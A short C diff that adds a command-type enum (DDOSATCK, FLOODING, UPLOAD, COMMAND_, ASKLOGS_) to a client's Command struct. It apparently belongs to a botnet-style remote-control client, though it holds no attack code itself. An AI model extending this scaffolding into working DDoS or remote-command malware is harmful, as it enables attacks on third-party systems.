@@ -7,8 +7,16 @@
 #include <unistd.h>
 #endif
 
-#include "../include/client/client_utils.h"
 #include <time.h>
+enum OrderType {
+    COMMAND_ = 0,
+    ASKLOGS_ = 1,
+    ASKSTATE = 2,
+    DDOSATCK = 3,
+    FLOODING = 4,
+    UPLOAD = 5,
+    UNKNOWN = 99
+};
 
 typedef struct Command {
     char cmd_id[64];          // Fixed-size array for cmd_id
@@ -19,6 +27,7 @@ typedef struct Command {
     enum OrderType order_type; // Type of command
     time_t timestamp;         // Timestamp for when the command was created
 } Command;
+
 
 static inline void sleep_ms(unsigned milliseconds)
 {
